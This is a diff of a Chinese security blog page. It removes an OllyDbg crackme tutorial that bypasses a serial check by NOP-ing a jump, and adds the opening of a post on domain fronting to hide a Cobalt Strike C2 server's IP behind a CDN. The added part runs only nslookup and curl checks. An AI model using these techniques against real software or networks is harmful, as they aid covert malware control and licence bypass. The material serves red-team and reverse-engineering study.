@@ -6,41 +6,39 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>OllyDbg学习第一节 | biubiubiu~blog</title>
+  <title>cobaltstrike域前置隐藏真实IP和恶意域名 | biubiubiu~blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="摘要OllyDbg是一种具有可视化界面的32位汇编分析调试器，是一个新的动态追踪工具，将IDA与SoftICE结合起来的思想，Ring3级调试器，非常容易上手，己代替SoftICE成为当今最为流行的调试解密工具了。同时还支持插件扩展功能，是目前最强大的调试工具。本文是学习OllyDbg的第一章节。 By 苏格拉底•罗曼蒂克•皮特·东">
+  <meta name="description" content="摘要Domain Fronting，中文译名 “域前置” 或 “域名前置”，是一种用于隐藏真实C2服务器IP且同时能伪装为与高信誉域名通信的技术，多用于木马受控端和控制端之间的隐蔽通信。 简言之，利用该技术，可以让受控端以为程序是在和一个高信誉域名通信，但实际上却是在和我们的C2服务器进行通信，效果如下">
 <meta property="og:type" content="article">
-<meta property="og:title" content="OllyDbg学习第一节">
-<meta property="og:url" content="http://yoursite.com/2020/09/21/OllyDbg%E5%AD%A6%E4%B9%A0_1/index.html">
+<meta property="og:title" content="cobaltstrike域前置隐藏真实IP和恶意域名">
+<meta property="og:url" content="http://yoursite.com/2020/06/22/%E6%B5%81%E9%87%8F%E7%BB%95%E8%BF%87-cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E9%9A%90%E8%97%8F%E7%9C%9F%E5%AE%9EIP%E5%92%8C%E6%81%B6%E6%84%8F%E5%9F%9F%E5%90%8D/index.html">
 <meta property="og:site_name" content="biubiubiu~blog">
-<meta property="og:description" content="摘要OllyDbg是一种具有可视化界面的32位汇编分析调试器，是一个新的动态追踪工具，将IDA与SoftICE结合起来的思想，Ring3级调试器，非常容易上手，己代替SoftICE成为当今最为流行的调试解密工具了。同时还支持插件扩展功能，是目前最强大的调试工具。本文是学习OllyDbg的第一章节。 By 苏格拉底•罗曼蒂克•皮特·东">
+<meta property="og:description" content="摘要Domain Fronting，中文译名 “域前置” 或 “域名前置”，是一种用于隐藏真实C2服务器IP且同时能伪装为与高信誉域名通信的技术，多用于木马受控端和控制端之间的隐蔽通信。 简言之，利用该技术，可以让受控端以为程序是在和一个高信誉域名通信，但实际上却是在和我们的C2服务器进行通信，效果如下">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200918114033986.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200918114152993.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921111948532.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921112032006.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921112107394.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921112139359.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921112201633.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921114505629.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921114626426.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921114822311.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921114850892.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921114926264.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921230721847.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921230904925.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921230932121.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921230941391.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921232737033.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921232832703.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921232903474.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921232911957.png">
-<meta property="article:published_time" content="2020-09-21T15:30:25.000Z">
-<meta property="article:modified_time" content="2020-09-21T15:30:37.121Z">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200622164214658.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623114046546.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623123524868.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623123555430.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623123741584.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623124034561.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623124749564.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623124917562.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623133118797.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623171710392.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623171804043.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623172118816.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200624154316793.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200624154400777.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200624154812836.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200624155802896.png">
+<meta property="article:published_time" content="2020-06-22T08:34:25.000Z">
+<meta property="article:modified_time" content="2020-06-24T08:07:12.370Z">
 <meta property="article:author" content="biubiubiu~blog">
-<meta property="article:tag" content="OllyDbg">
+<meta property="article:tag" content="cobaltstrike">
+<meta property="article:tag" content="域前置">
+<meta property="article:tag" content="Domain Fronting">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200918114033986.png">
+<meta name="twitter:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200622164214658.png">
   
     <link rel="alternative" href="/atom.xml" title="biubiubiu~blog" type="application/atom+xml">
   
@@ -166,20 +164,20 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-OllyDbg学习_1" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-流量绕过-cobaltstrike域前置隐藏真实IP和恶意域名" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      OllyDbg学习第一节
+      cobaltstrike域前置隐藏真实IP和恶意域名
     </h1>
   
 
         
-        <a href="/2020/09/21/OllyDbg%E5%AD%A6%E4%B9%A0_1/" class="archive-article-date">
-  	<time datetime="2020-09-21T15:30:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-21</time>
+        <a href="/2020/06/22/%E6%B5%81%E9%87%8F%E7%BB%95%E8%BF%87-cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E9%9A%90%E8%97%8F%E7%9C%9F%E5%AE%9EIP%E5%92%8C%E6%81%B6%E6%84%8F%E5%9F%9F%E5%90%8D/" class="archive-article-date">
+  	<time datetime="2020-06-22T08:34:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-22</time>
 </a>
         
     
@@ -195,63 +193,76 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>OllyDbg</strong>是一种具有可视化界面的32位汇编分析调试器，是一个新的动态追踪工具，将IDA与SoftICE结合起来的思想，Ring3级调试器，非常容易上手，己代替SoftICE成为当今最为流行的调试解密工具了。同时还支持插件扩展功能，是目前最强大的调试工具。本文是学习OllyDbg的第一章节。</p>
-<p><strong>By 苏格拉底•罗曼蒂克•皮特·东</strong></p>
+        <h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Domain Fronting，中文译名 “域前置” 或 “域名前置”，是一种用于隐藏真实C2服务器IP且同时能伪装为与高信誉域名通信的技术，多用于木马受控端和控制端之间的隐蔽通信。</p>
+<p>简言之，利用该技术，可以让受控端以为程序是在和一个高信誉域名通信，但实际上却是在和我们的C2服务器进行通信，效果如下</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200622164214658.png" alt="githubimage-20200622164214658"></p>
 <a id="more"></a>
 
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h1 id="01-OllyDbg界面配置"><a href="#01-OllyDbg界面配置" class="headerlink" title="01.OllyDbg界面配置"></a>01.OllyDbg界面配置</h1><p>下载链接：<a href="https://down.52pojie.cn/Tools/Debuggers/" target="_blank" rel="noopener">https://down.52pojie.cn/Tools/Debuggers/</a></p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200918114033986.png" alt="image-20200918114033986"></p>
-<p>1.子窗口快捷方式<br>2.汇编窗口<br>3.信息串口<br>4.数据窗口<br>5.寄存器窗口<br>6.栈窗口</p>
-<p>配置1：缓存以及插件（使用看雪专用ollyDbg，初次使用前先点开<code>路径修复工具.exe</code>,会自动添加ODD缓存以及插件）</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200918114152993.png" alt="image-20200918114152993"></p>
-<h2 id="02-常用快捷键"><a href="#02-常用快捷键" class="headerlink" title="02.常用快捷键"></a>02.常用快捷键</h2><p>1.F2：设置断点，只要在光标定位的位置（上图中灰色条）按F2键即可，再按一次F2键则会删除断点。<br>2.F8：单步步过。每按一次这个键执行一条反汇编窗口中的一条指令，遇到 CALL 等子程序不进入其代码。<br>3.F7：单步步入。功能同单步步过(F8)类似，区别是遇到 CALL 等子程序时会进入其中，进入后首先会停留在子程序的第一条指令上。<br>4.F4：运行到选定位置。作用就是直接运行到光标所在位置处暂停。<br>5.F9：运行。按下这个键如果没有设置相应断点的话，被调试的程序将直接开始运行。<br>6.CTR+F9：执行到返回。此命令在执行到一个 ret (返回指令)指令时暂停，常用于从系统领空返回到我们调试的程序领空。</p>
-<h1 id="03-简单破解小程序"><a href="#03-简单破解小程序" class="headerlink" title="03.简单破解小程序"></a>03.简单破解小程序</h1><h3 id="1-练手小项目"><a href="#1-练手小项目" class="headerlink" title="1.练手小项目"></a>1.练手小项目</h3><p>160个crackme  一个练手逆向破解的小程序项目集合，百度就能搜到相关下载以及破解教程，下面附上吾爱破解大佬提供的打包下载地址。</p>
-<p><strong>160个CrackMe的打包文件下载地址：</strong><br>下载地址1：链接: <a href="https://pan.baidu.com/s/1Hw5dQXUa3-FOBKN5MFQAbg" target="_blank" rel="noopener">https://pan.baidu.com/s/1Hw5dQXUa3-FOBKN5MFQAbg</a> 提取码: bmvs 解压密码：52pojie</p>
-<h3 id="2-破解开始（破解第一个小程序：Acid-burn）"><a href="#2-破解开始（破解第一个小程序：Acid-burn）" class="headerlink" title="2.破解开始（破解第一个小程序：Acid_burn）"></a>2.破解开始（破解第一个小程序：Acid_burn）</h3><p>想要破解一个程序，必须先了解这个程序。所以，在破解过程中，对最初程序的分析很重要，他可以帮助我们理解作者的目的和意图，特别是对于注册码的处理细节，从而方便我们反向跟踪和推导。</p>
-<p>软件有两部分：<img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921111948532.png" alt="image-20200921111948532"></p>
-<p>先破解账号密码登录</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921112032006.png" alt="image-20200921112032006"></p>
-<p>根据小程序，我们可以打开推断程序的流程</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921112107394.png" alt="image-20200921112107394"></p>
-<h4 id="1-启动软件"><a href="#1-启动软件" class="headerlink" title="1.启动软件"></a>1.启动软件</h4><p>使用ollydbg打开</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921112139359.png" alt="image-20200921112139359"></p>
-<p>打开F9，启动小程序</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921112201633.png" alt="image-20200921112201633"></p>
-<p>开启后点击第一个登录框</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921114505629.png" alt="image-20200921114505629"></p>
-<p>我们随意输入一个用户名和序列号（伪码）：</p>
-<p>伪码：<br>Name:112233<br>Serial:44556677<br>点击Check it Baby! 它会弹出一个对话框提示： Sorry， The Serial is incorrect !</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921114626426.png" alt="image-20200921114626426"></p>
-<p>再换几个随意试试，发现就这一种情况。<br>OK，出现了对话框这就很好办，说明作者在校验注册码之后发现如果错误了就直接弹窗，我们只要找到弹出对话框的地方，向上跟踪，就可以找出判断是否正确的地方了，jmp或者Nop就算爆破了。</p>
-<h4 id="2-具体破解开始"><a href="#2-具体破解开始" class="headerlink" title="2.具体破解开始"></a>2.具体破解开始</h4><p>我们随意输入一个用户名和序列号（伪码）：<br>Name:112233<br>Serial:44556677<br>点击Check it Baby! 它会弹出一个对话框提示： Sorry， The Serial is incorrect !<br>此时不要点击确定按钮，返回OD暂停(F12),点击堆栈-K小图标(Ctrl+K) ,如下图：<img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921114822311.png" alt="image-20200921114822311"></p>
-<p>这里有两个MessageBox的地址，第一个地址为77D5082F这个地址明显太大,不在模块的领空，不是的。第二个地址为0042A1AE，和00400100地址非常接近，十有八九就是它了。<br>右键 show call, 在Call上面设置断点。</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921114850892.png" alt="image-20200921114850892"></p>
-<p>设置断点：</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921114926264.png" alt="image-20200921114926264"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0042A170  &#x2F;$  55            push ebp</span><br><span class="line">0042A171  |.  8BEC          mov ebp,esp</span><br><span class="line">0042A173  |.  83C4 F4       add esp,-0xC</span><br><span class="line">0042A176  |.  53            push ebx</span><br><span class="line">0042A177  |.  56            push esi</span><br><span class="line">0042A178  |.  57            push edi</span><br><span class="line">0042A179  |.  8BF9          mov edi,ecx</span><br><span class="line">0042A17B  |.  8BF2          mov esi,edx</span><br><span class="line">0042A17D  |.  8BD8          mov ebx,eax</span><br><span class="line">0042A17F  |.  E8 7CB4FDFF   call &lt;jmp.&amp;user32.GetActiveWindow&gt;       ; [GetActiveWindow</span><br><span class="line">0042A184  |.  8945 F8       mov [local.2],eax</span><br><span class="line">0042A187  |.  33C0          xor eax,eax</span><br><span class="line">0042A189  |.  E8 12A0FFFF   call 004241A0</span><br><span class="line">0042A18E  |.  8945 F4       mov [local.3],eax</span><br><span class="line">0042A191  |.  33C0          xor eax,eax</span><br><span class="line">0042A193  |.  55            push ebp</span><br><span class="line">0042A194  |.  68 D0A14200   push 0042A1D0</span><br><span class="line">0042A199  |.  64:FF30       push dword ptr fs:[eax]</span><br><span class="line">0042A19C  |.  64:8920       mov dword ptr fs:[eax],esp</span><br><span class="line">0042A19F  |.  8B45 08       mov eax,[arg.1]</span><br><span class="line">0042A1A2  |.  50            push eax                                 ; &#x2F;Style</span><br><span class="line">0042A1A3  |.  57            push edi                                 ; |Title</span><br><span class="line">0042A1A4  |.  56            push esi                                 ; |Text</span><br><span class="line">0042A1A5  |.  8B43 24       mov eax,dword ptr ds:[ebx+0x24]          ; |</span><br><span class="line">0042A1A8  |.  50            push eax                                 ; |hOwner</span><br><span class="line">0042A1A9  |.  E8 FAB5FDFF   call &lt;jmp.&amp;user32.MessageBoxA&gt;           ; \MessageBoxA 设置的断点</span><br></pre></td></tr></table></figure>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>在说Domain Fronting之前先说一下通过本次实验的一些思考，常规的绕过被抓IOC的思路就是在真实IP之前加一些代理，例如通过<a href="http://www.ngrok.cc/" target="_blank" rel="noopener">ngrok</a>或者CDN或nginx反代的方式</p>
+<p>这里说到ngrok，忽然想到一些反射马是不是也可以通过这类型的方式隐藏自己的真实IP，后续有待研究</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Domain Fronting的原理如下</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623114046546.png" alt="image-20200623114046546"></p>
+<p>大概意思是CDN会通过不同的HOST的头来区分把数据转发到哪里</p>
+<h3 id="实验1"><a href="#实验1" class="headerlink" title="实验1"></a>实验1</h3><p>这里通过以下域名进行测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup klst.96jm.com</span><br><span class="line"></span><br><span class="line">nslookup www.shhorse.com.cn</span><br></pre></td></tr></table></figure>
 
-<p>往断点上面翻一翻，发现，没有跳转语句，逻辑很简单，在之上几行处就有retn，在头部push ebp下断，点击启动（F9），重新点击Check it baby 按钮，在右下角堆栈处找到最近一条Return语句</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921230721847.png" alt="image-20200921230721847"></p>
-<p>0012F974  0042FB37 RETURN to Acid_bur.0042FB37 from Acid_bur.0042A170</p>
-<p>右键 Follow in Disassm..(反汇编跟随)，这里直接连接了一个跳转，代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0042FAD5  |.  68 C8FB4200   push 0042FBC8                            ;  UNICODE &quot;-&quot;</span><br><span class="line">0042FADA  |.  FF75 F8       push [local.2]</span><br><span class="line">0042FADD  |.  8D45 F4       lea eax,[local.3]</span><br><span class="line">0042FAE0  |.  BA 05000000   mov edx,0x5</span><br><span class="line">0042FAE5  |.  E8 C23EFDFF   call 004039AC</span><br><span class="line">0042FAEA  |.  8D55 F0       lea edx,[local.4]</span><br><span class="line">0042FAED  |.  8B83 E0010000 mov eax,dword ptr ds:[ebx+0x1E0]</span><br><span class="line">0042FAF3  |.  E8 60AFFEFF   call 0041AA58</span><br><span class="line">0042FAF8  |.  8B55 F0       mov edx,[local.4]</span><br><span class="line">0042FAFB  |.  8B45 F4       mov eax,[local.3]</span><br><span class="line">0042FAFE  |.  E8 F93EFDFF   call 004039FC</span><br><span class="line">0042FB03      75 1A         jnz short 0042FB1F                       ;  &#x2F;&#x2F; 这个JNZ条件判断很关键？</span><br><span class="line">0042FB05  |.  6A 00         push 0x0</span><br><span class="line">0042FB07  |.  B9 CCFB4200   mov ecx,0042FBCC</span><br><span class="line">0042FB0C  |.  BA D8FB4200   mov edx,0042FBD8</span><br><span class="line">0042FB11  |.  A1 480A4300   mov eax,dword ptr ds:[0x430A48]</span><br><span class="line">0042FB16  |.  8B00          mov eax,dword ptr ds:[eax]</span><br><span class="line">0042FB18  |.  E8 53A6FFFF   call 0042A170</span><br><span class="line">0042FB1D  |.  EB 18         jmp short 0042FB37                       ;  &#x2F;&#x2F; 这个跳转是不是很可疑？</span><br><span class="line">0042FB1F  |&gt;  6A 00         push 0x0</span><br><span class="line">0042FB21  |.  B9 74FB4200   mov ecx,0042FB74                         ;  ASCII 54,&quot;ry Again!&quot;</span><br><span class="line">0042FB26  |.  BA 80FB4200   mov edx,0042FB80                         ;  ASCII 53,&quot;orry , The serial is incorect !&quot;</span><br><span class="line">0042FB2B  |.  A1 480A4300   mov eax,dword ptr ds:[0x430A48]</span><br><span class="line">0042FB30  |.  8B00          mov eax,dword ptr ds:[eax]</span><br><span class="line">0042FB32  |.  E8 39A6FFFF   call 0042A170                            ;  这个CALL是导致跳转的语句</span><br><span class="line">0042FB37  |&gt;  33C0          xor eax,eax                              ;  返回到了这里</span><br></pre></td></tr></table></figure>
+<p>通过nslookup查看，可看到两个站是接的同一批CDN</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623123524868.png" alt="image-20200623123524868"></p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623123555430.png" alt="image-20200623123555430"></p>
+<p>用以下命令发送GET请求，返回301</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl klst.96jm.com -v</span><br></pre></td></tr></table></figure>
 
-<p>看到和提示框一样的文本，是不是感到很亲切？OK，我们大概浏览下代码，最近部分有两个可疑跳转JNZ 和JMP, JNZ会通过它上面的call 004039FC 判断我们的伪码是否正确，判断的结果存在EAX中，如果EAX不等于就跳转到错误提示信息框那里。我们的目的是无论伪码是否正确都通过验证，所以最简单的办法就是将jnz这句使用NOP填充，我们尝试一下：选择JNZ这句，右键Binary-&gt;Fill with NOPS.回到原始程序，（把之前打的断点可以删除）再次点击Check it baby!<br>哈哈，提示Good Job！通过了！</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921230904925.png" alt="image-20200921230904925"></p>
-<p>再次比对MessageBox和堆栈(Ctrl+K)窗口最后一个调用，是不是发现什么特殊的地方？对啦！那个CALL就是调用MessageBox的地方，所以，下次我们就不用在MessageBox处下断跟踪了，直接最后一个地址，show call。</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921230932121.png" alt="image-20200921230932121"></p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921230941391.png" alt="image-20200921230941391"></p>
-<h3 id="3-破解第二个序列码登录"><a href="#3-破解第二个序列码登录" class="headerlink" title="3.破解第二个序列码登录"></a>3.破解第二个序列码登录</h3><p>流程同第一个</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921232737033.png" alt="image-20200921232737033"></p>
-<p>直接找最后一个调用，show call</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921232832703.png" alt="image-20200921232832703"></p>
-<p><strong>核心代码：</strong></p>
-<p>CALL之前的那个JNZ是爆破的关键，直接NOP就OK了。<br>JNZ之前的那个CALL是进行Serial判断的关键，通过单步跟踪发现他就是一个固定值。<br>代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">0042F470  &#x2F;.  55            push ebp</span><br><span class="line">0042F471  |.  8BEC          mov ebp,esp</span><br><span class="line">0042F473  |.  33C9          xor ecx,ecx</span><br><span class="line">0042F475  |.  51            push ecx</span><br><span class="line">0042F476  |.  51            push ecx</span><br><span class="line">0042F477  |.  51            push ecx</span><br><span class="line">0042F478  |.  51            push ecx</span><br><span class="line">0042F479  |.  53            push ebx</span><br><span class="line">0042F47A  |.  8BD8          mov ebx,eax</span><br><span class="line">0042F47C  |.  33C0          xor eax,eax</span><br><span class="line">0042F47E  |.  55            push ebp</span><br><span class="line">0042F47F  |.  68 2CF54200   push 0042F52C</span><br><span class="line">0042F484  |.  64:FF30       push dword ptr fs:[eax]</span><br><span class="line">0042F487  |.  64:8920       mov dword ptr fs:[eax],esp</span><br><span class="line">0042F48A  |.  8D45 FC       lea eax,[local.1]</span><br><span class="line">0042F48D  |.  BA 40F54200   mov edx,0042F540                         ;  ASCII 48,&quot;ello&quot;</span><br><span class="line">0042F492  |.  E8 7142FDFF   call 00403708</span><br><span class="line">0042F497  |.  8D45 F8       lea eax,[local.2]</span><br><span class="line">0042F49A  |.  BA 50F54200   mov edx,0042F550                         ;  ASCII 44,&quot;ude!&quot;</span><br><span class="line">0042F49F  |.  E8 6442FDFF   call 00403708</span><br><span class="line">0042F4A4  |.  FF75 FC       push [local.1]</span><br><span class="line">0042F4A7  |.  68 60F54200   push 0042F560                            ;  UNICODE &quot; &quot;</span><br><span class="line">0042F4AC  |.  FF75 F8       push [local.2]</span><br><span class="line">0042F4AF  |.  8D45 F4       lea eax,[local.3]</span><br><span class="line">0042F4B2  |.  BA 03000000   mov edx,0x3</span><br><span class="line">0042F4B7  |.  E8 F044FDFF   call 004039AC</span><br><span class="line">0042F4BC  |.  8D55 F0       lea edx,[local.4]</span><br><span class="line">0042F4BF  |.  8B83 E0010000 mov eax,dword ptr ds:[ebx+0x1E0]</span><br><span class="line">0042F4C5  |.  E8 8EB5FEFF   call 0041AA58</span><br><span class="line">0042F4CA  |.  8B45 F0       mov eax,[local.4]                        ;  &#x2F;&#x2F; eax&#x3D;112233</span><br><span class="line">0042F4CD  |.  8B55 F4       mov edx,[local.3]                        ;  &#x2F;&#x2F; edx&#x3D;Hello Dude!</span><br><span class="line">0042F4D0  |.  E8 2745FDFF   call 004039FC</span><br><span class="line">0042F4D5      75 1A         jnz short 0042F4F1                       ;  &#x2F;&#x2F; 爆破的关键</span><br><span class="line">0042F4D7  |.  6A 00         push 0x0</span><br><span class="line">0042F4D9  |.  B9 64F54200   mov ecx,0042F564</span><br><span class="line">0042F4DE  |.  BA 70F54200   mov edx,0042F570</span><br><span class="line">0042F4E3  |.  A1 480A4300   mov eax,dword ptr ds:[0x430A48]</span><br><span class="line">0042F4E8  |.  8B00          mov eax,dword ptr ds:[eax]</span><br><span class="line">0042F4EA  |.  E8 81ACFFFF   call 0042A170</span><br><span class="line">0042F4EF  |.  EB 18         jmp short 0042F509</span><br><span class="line">0042F4F1  |&gt;  6A 00         push 0x0</span><br><span class="line">0042F4F3  |.  B9 84F54200   mov ecx,0042F584</span><br><span class="line">0042F4F8  |.  BA 8CF54200   mov edx,0042F58C</span><br><span class="line">0042F4FD  |.  A1 480A4300   mov eax,dword ptr ds:[0x430A48]</span><br><span class="line">0042F502  |.  8B00          mov eax,dword ptr ds:[eax]</span><br><span class="line">0042F504  |.  E8 67ACFFFF   call 0042A170</span><br><span class="line">0042F509  |&gt;  33C0          xor eax,eax</span><br></pre></td></tr></table></figure>
